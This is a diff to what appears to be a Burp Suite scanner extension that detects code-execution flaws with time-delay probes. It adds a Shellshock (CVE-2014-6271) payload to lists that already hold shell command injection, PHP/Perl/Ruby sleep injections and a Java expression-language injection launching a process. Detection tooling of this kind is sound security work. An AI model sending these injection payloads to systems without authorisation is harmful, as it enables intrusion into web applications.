@@ -60,8 +60,9 @@ class CodeExec(IScannerCheck):
             'perl':["'.sleep($time).'", '".sleep($time)."', 'sleep($time)'],
             'ruby':["'+sleep($time)+'", '"+sleep($time)+"'],
             
-            # Exploits shell command injection into '$input' on linux and "$input" on windows: 
-            'any':['"&timeout $time&\'`sleep $time`\''],
+            # Exploits shell command injection into '$input' on linux and "$input" on windows:
+            # and CVE-2014-6271
+            'any':['"&timeout $time&\'`sleep $time`\'', '() { :;}; sleep $time'],
             
             # Expression language injection
             'java':['$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
